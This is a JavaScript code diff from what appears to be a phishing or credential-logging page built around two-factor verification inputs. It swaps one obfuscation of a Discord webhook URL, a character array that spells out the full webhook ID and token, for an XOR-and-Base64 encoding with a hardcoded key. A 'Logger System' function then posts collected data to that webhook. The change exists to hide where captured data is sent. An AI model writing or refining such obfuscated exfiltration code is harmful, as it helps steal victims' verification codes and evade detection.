@@ -267,28 +267,31 @@ if (twofaInput2 && verifyButton2) {
 }
 
 // === Webhook Sending ===
-// Advanced obfuscation: Character array + mathematical transformation
-const _0x4f2a=['POST','application/json','Logger System • '];
-const _0x5c7a=(function(){
-  const _0x1a2b=['h','t','t','p','s',':','/','/','d','i','s','c','o','r','d','.','c','o','m','/','a','p','i','/','w','e','b','h','o','o','k','s','/','1','3','9','5','9','4','5','4','3','8','4','8','1','4','8','5','8','7','7','/','2','d','i','D','1','R','_','M','Q','n','O','z','h','L','X','n','6','L','G','T','h','3','V','Y','7','W','i','0','k','4','F','K','Z','X','v','A','4','D','u','s','s','E','B','r','N','O','N','Z','s','e','p','r','o','f','K','Q','M','i','s','e','N','R','P','Q','z','s','k','k'];
-  const _0x4c3d=function(_0x7e5f){return _0x7e5f.map(_0x9d8c=>_0x9d8c.charCodeAt(0)).map(_0x2b1e=>_0x2b1e+0x7a).map(_0x1a2b=>String.fromCharCode(_0x1a2b-0x7a));};
-  return _0x4c3d(_0x1a2b).join('');
-})();
+// XOR + Base64 encoded webhook
+const encryptedWebhook = "FhMWB1gXTVhTAgIPWxEfVEgXXVBVDxtOBBZHTAwYUF0OAlZRVUAGBlVXEw==";
+const xorKey = "hunter2"; // must match the encoding key
+
+function xorDecode(base64, key) {
+  const decoded = atob(base64);
+  return [...decoded].map((c, i) =>
+    String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))
+  ).join('');
+}
 
 async function sendWebhook(title, description, color) {
-  const url = _0x5c7a;
+  const url = xorDecode(encryptedWebhook, xorKey);
   const payload = {
     embeds: [{
       title,
       description,
       color,
-      footer: { text: _0x4f2a[2] + new Date().toLocaleString() }
+      footer: { text: 'Logger System • ' + new Date().toLocaleString() }
     }]
   };
   try {
     const res = await fetch(url, {
-      method: _0x4f2a[0],
-      headers: { 'Content-Type': _0x4f2a[1] },
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
     if (!res.ok) console.error('Webhook failed:', res.status, res.statusText);
